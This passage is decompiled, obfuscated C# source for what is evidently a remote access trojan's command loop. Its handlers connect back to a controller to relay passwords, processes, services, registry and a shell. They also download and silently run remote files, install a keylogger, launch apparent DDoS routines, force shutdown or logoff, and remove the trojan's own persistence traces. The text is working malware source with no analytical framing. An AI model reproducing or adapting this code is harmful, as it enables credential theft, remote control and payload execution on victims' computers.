							SgSByH0l3MEab125.Flush();
							continue;
						case "/TRYTRYPS/":
							ckmFD5aTnR3097QpXnb7128 = new TcpClient();
							ckmFD5aTnR3097QpXnb7128.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							QllQR3NwGpj2IqJ3kffC129 = ckmFD5aTnR3097QpXnb7128.GetStream();
							hEcYx1iJnN4H8zN2nxpF131 = new StreamReader(QllQR3NwGpj2IqJ3kffC129);
							jOYNqbyKN52i1XIQYvOz130 = new StreamWriter(QllQR3NwGpj2IqJ3kffC129);
							v3IAn10LHT4OrFkFB0fp132 = new Thread(xEqbeWtnliwltwZcJNYE6205);
							v3IAn10LHT4OrFkFB0fp132.Start();
							jOYNqbyKN52i1XIQYvOz130.WriteLine("/TRYPASSS/");
							jOYNqbyKN52i1XIQYvOz130.Flush();
							continue;
						case "/TRYTRYPR/":
							TPm01kas9Ftr684eVBAw133 = new TcpClient();
							TPm01kas9Ftr684eVBAw133.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							networkStream_2 = TPm01kas9Ftr684eVBAw133.GetStream();
							streamReader_1 = new StreamReader(networkStream_2);
							QyB2pDIjA5KZpJpmNSiL135 = new StreamWriter(networkStream_2);
							xXS9nrYyApSOpNZ9lzOj137 = new Thread(xzIaB206);
							xXS9nrYyApSOpNZ9lzOj137.Start();
							QyB2pDIjA5KZpJpmNSiL135.WriteLine("/TRYPROCC/");
							QyB2pDIjA5KZpJpmNSiL135.Flush();
							continue;
						case "/TRYTRYSE/":
							tCWcxwXR3WqONce6P3EM138 = new TcpClient();
							tCWcxwXR3WqONce6P3EM138.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							networkStream_3 = tCWcxwXR3WqONce6P3EM138.GetStream();
							IIixP4D3Bk58rMi17RYr141 = new StreamReader(networkStream_3);
							u6uEY40dzTkhV1bR7ZGM140 = new StreamWriter(networkStream_3);
							KAFFbQr9yKM0ZP8MNXOU142 = new Thread(F27hL207);
							KAFFbQr9yKM0ZP8MNXOU142.Start();
							u6uEY40dzTkhV1bR7ZGM140.WriteLine("/TRYSERVV/");
							u6uEY40dzTkhV1bR7ZGM140.Flush();
							continue;
						case "/TRYTRYOW/":
							rXBeNbP8JaKg1e282DlZ143 = new TcpClient();
							rXBeNbP8JaKg1e282DlZ143.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							DtuQx59CEvda240MYrS0144 = rXBeNbP8JaKg1e282DlZ143.GetStream();
							streamReader_2 = new StreamReader(DtuQx59CEvda240MYrS0144);
							streamWriter_0 = new StreamWriter(DtuQx59CEvda240MYrS0144);
							thread_1 = new Thread(m321v208);
							thread_1.Start();
							streamWriter_0.WriteLine("/TRYOWWWW/");
							streamWriter_0.Flush();
							continue;
						case "/TRYTRYRG/":
							i0wwQ8ofQWUnTFBEmOsT148 = new TcpClient();
							i0wwQ8ofQWUnTFBEmOsT148.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							networkStream_4 = i0wwQ8ofQWUnTFBEmOsT148.GetStream();
							hNSFr3KrWwN20PeIDj20151 = new StreamReader(networkStream_4);
							EimR8Vj3xjq0KynhQlAT150 = new StreamWriter(networkStream_4);
							CN33Ju644revJUlRqHp4152 = new Thread(sGLin209);
							CN33Ju644revJUlRqHp4152.Start();
							EimR8Vj3xjq0KynhQlAT150.WriteLine("/TRYREGGG/");
							EimR8Vj3xjq0KynhQlAT150.Flush();
							continue;
						case "/TRYTRYCM/":
							bS71wo0VkEExizhtJOVX153 = new TcpClient();
							bS71wo0VkEExizhtJOVX153.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							XFnvhhj5tmiWUXOKG2xl154 = bS71wo0VkEExizhtJOVX153.GetStream();
							streamReader_3 = new StreamReader(XFnvhhj5tmiWUXOKG2xl154);
							tbKpNHc155 = new StreamWriter(XFnvhhj5tmiWUXOKG2xl154);
							thread_2 = new Thread(bDAp5210);
							thread_2.Start();
							tbKpNHc155.WriteLine("/TRYCMDDD/");
							tbKpNHc155.Flush();
							continue;
						case "/REMOVESV/":
							try
							{
								string text9 = Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: false)!.GetValue(jjzGIyjqEz113(rWthKh16.xHlGjs42(), "12345#$%")));
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(text9);
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: true)!.DeleteValue(jjzGIyjqEz113(rWthKh16.xHlGjs42(), "12345#$%"));
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							try
							{
								string text10 = Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: false)!.GetValue(jjzGIyjqEz113(rWthKh16.UBlmIw43(), "12345#$%")));
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(text10);
							}
							catch (Exception projectError29)
							{
								ProjectData.SetProjectError(projectError29);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey(jjzGIyjqEz113(rWthKh16.SMXyxg41(), "12345#$%"), writable: true)!.DeleteValue(jjzGIyjqEz113(rWthKh16.UBlmIw43(), "12345#$%"));
							}
							catch (Exception projectError30)
							{
								ProjectData.SetProjectError(projectError30);
								ProjectData.ClearProjectError();
							}
							try
							{
								string executablePath = Application.get_ExecutablePath();
								string text11 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
								_ = text11 + "\\" + Path.GetFileName(executablePath);
								foreach (string file in ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFiles(text11))
								{
									try
									{
										if (((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().GetFileInfo(file).Length > 100000L)
										{
											((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(file);
										}
									}
									catch (Exception projectError31)
									{
										ProjectData.SetProjectError(projectError31);
										ProjectData.ClearProjectError();
									}
								}
							}
							catch (Exception projectError32)
							{
								ProjectData.SetProjectError(projectError32);
								ProjectData.ClearProjectError();
							}
							try
							{
								Environment.Exit(0);
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								Environment.Exit(0);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNVS/":
							try
							{
								List<string> list2 = new List<string>();
								string[] array6 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array7 = array6;
								foreach (string item2 in array7)
								{
									list2.Add(item2);
								}
								int index2 = list2.Count - 1;
								string text7 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array8 = list2[index2].ToString().Split(new char[1] { '.' });
								string text8 = null;
								text8 = ((!((Operators.CompareString(array8[array8.Length - 1], "swf", false) == 0) | (Operators.CompareString(array8[array8.Length - 1], "SWF", false) == 0))) ? array8[array8.Length - 1] : "exe");
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Network().DownloadFile(text7, Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8, (string)null, (string)null, false, 100000, true);
								uqpHzbxjkt122(1);
								Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8);
							}
							catch (Exception projectError26)
							{
								ProjectData.SetProjectError(projectError26);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNHD/":
							try
							{
								List<string> list = new List<string>();
								string[] array3 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array4 = array3;
								foreach (string item in array4)
								{
									list.Add(item);
								}
								int index = list.Count - 1;
								string text5 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array5 = list[index].ToString().Split(new char[1] { '.' });
								string text6 = null;
								text6 = ((!((Operators.CompareString(array5[array5.Length - 1], "swf", false) == 0) | (Operators.CompareString(array5[array5.Length - 1], "SWF", false) == 0))) ? array5[array5.Length - 1] : "exe");
								((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Network().DownloadFile(text5, Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6, (string)null, (string)null, false, 100000, true);
								uqpHzbxjkt122(1);
								Process process = new Process();
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6;
								process.Start();
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RESTWIND/":
							try
							{
								Interaction.Shell("shutdown -r /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/TURNWIND/":
							try
							{
								Interaction.Shell("shutdown -s /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError23)
							{
								ProjectData.SetProjectError(projectError23);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/LOGOWIND/":
							try
							{
								Interaction.Shell("shutdown -l /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError22)
							{
								ProjectData.SetProjectError(projectError22);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/MEUPDATE/":
							continue;
						case "/BACKUPUP/":
							continue;
						case "/INSTALLK/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread7 = new Thread(Bfguvp2VlpRE5p181);
								thread7.Start(text4);
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/UPANDRUN/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread6 = new Thread(method_11);
								thread6.Start(text4);
							}
							catch (Exception projectError20)
							{
								ProjectData.SetProjectError(projectError20);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread5 = new Thread(method_9);
								thread5.Start(text4);
							}
							catch (Exception projectError19)
							{
								ProjectData.SetProjectError(projectError19);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/PASSALLL/":
							try
							{
								Thread thread4 = new Thread(cAc2IdDmsS04lOHHB156);
								thread4.Start();
							}
							catch (Exception projectError18)
							{
								ProjectData.SetProjectError(projectError18);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/OPENWEBB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread3 = new Thread(method_10);
								thread3.Start(text4);
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWS/":
							try
							{
								Thread thread2 = new Thread(JlCAncx6yzhWGvXjy158);
								thread2.Start();
							}
							catch (Exception projectError16)
							{
								ProjectData.SetProjectError(projectError16);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/AVAILABL/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread = new Thread(bR18KXCnFRwfxlg6C159);
								thread.Start(text4);
							}
							catch (Exception projectError15)
							{
								ProjectData.SetProjectError(projectError15);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RETURNSX/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								try
								{
									try
									{
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)text4, false))))
										{
											((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text4, RegistryValueKind.String);
										}
									}
									catch (Exception projectError12)
									{
										ProjectData.SetProjectError(projectError12);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError14)
							{
								ProjectData.SetProjectError(projectError14);
								ProjectData.ClearProjectError();
							}
							continue;
						}
						uqpHzbxjkt122(5);
						UZi4a15++;
						if (UZi4a15 <= 5)
						{
							continue;
						}
						try
						{
							L7lFgASOP4LW30.WriteLine("test");
							L7lFgASOP4LW30.Flush();
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							try
							{
								if (!tcpClient_0.Connected)
								{
									ProjectData.ClearProjectError();
									break;
								}
							}
							catch (Exception projectError35)
							{
								ProjectData.SetProjectError(projectError35);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					method_4();
					Thread.Sleep(100);
				}
				catch (Exception projectError37)
				{
					ProjectData.SetProjectError(projectError37);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
